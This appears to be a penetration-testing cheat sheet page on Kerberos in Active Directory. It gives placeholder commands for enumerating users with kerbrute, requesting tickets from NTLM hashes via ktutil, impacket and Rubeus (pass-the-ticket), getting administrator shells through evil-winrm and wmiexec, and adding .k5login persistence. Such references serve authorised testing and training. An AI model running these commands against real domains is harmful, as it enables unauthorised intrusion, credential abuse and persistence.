---
title: "Kerberos"
date: 2024-7-2
tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain controller", "Windows", "smb"]
---

### Users enum

{{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
```

</div>

<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>

{{< /tabcontent >}}

### Usernames generator

{{< tab set2 tab1 active >}}username-anarchy{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```console
./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE>
```

</div>

<small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>

{{< /tabcontent >}}

<br>

---

### Generate Kerberos ticket (From Linux)

{{< tab set3 tab1 active >}}Impacket{{< /tab >}}
{{< tab set3 tab2 >}}Kinit{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```console
# Auth with password
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
```

```console
# Auth with hash
sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>'
```

```console
export KRB5CCNAME=<USER>.ccache
```

```console
# Check ticket
klist
```

</div>

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

<div>

```console
# Step 0: Installation
sudo apt install krb5-user cifs-utils
```

```console
# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
<TARGET> <DC> <DOMAIN>
```

```console
# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
nameserver <TARGET>
```

```console
# Step 3: Edit '/etc/krb5.conf'

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console
# Step 4: Sync time to domain controller
sudo ntpdate -s <DC>
```

</div>

#### 2a. Without creds

<div>

```console
# Generate kerberos ticket for user
kinit <USER>
```

</div>

#### 2b. With NTLM hash

<div>

```console
ktutil
```

```console
add_entry -p administrator@<DOMAIN> -k 1 -key -e rc4-hmac
```

```console
<HASH>
```

```console
write_kt administrator.keytab
```

```console
exit
```

```console
kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
```

</div>

#### 3. Check ticket

<div>

```console
klist
```

</div>

{{< /tabcontent >}}

### Generate Kerberos ticket (From Windows)

{{< tab set4 tab1 active >}}rubeus{{< /tab >}}
{{< tabcontent set4 tab1 >}}

<div>

```console
.\Rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

</div>

{{< /tabcontent >}}

<br>

---


### Winrm with Kerberos

{{< tab set5 tab1 active >}}evil-winrm{{< /tab >}}
{{< tab set5 tab2 >}}wmiexec{{< /tab >}}
{{< tabcontent set5 tab1 >}}

<div>

```console
# Step 1: Edit '/etc/krb5.conf'

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```


```console
# Step 2: Connect
sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set5 tab2 >}}

<div>

```console
sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/administrator@<TARGET_DOMAIN>' -k -no-pass
```

</div>

{{< /tabcontent >}}

<br>

---

### Connect to SMB with Kerberos

<div>

```console
sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

</div>

<br>

---

### Add Kerberos Access in Linux

<div>

```console
echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
```

</div>

<br>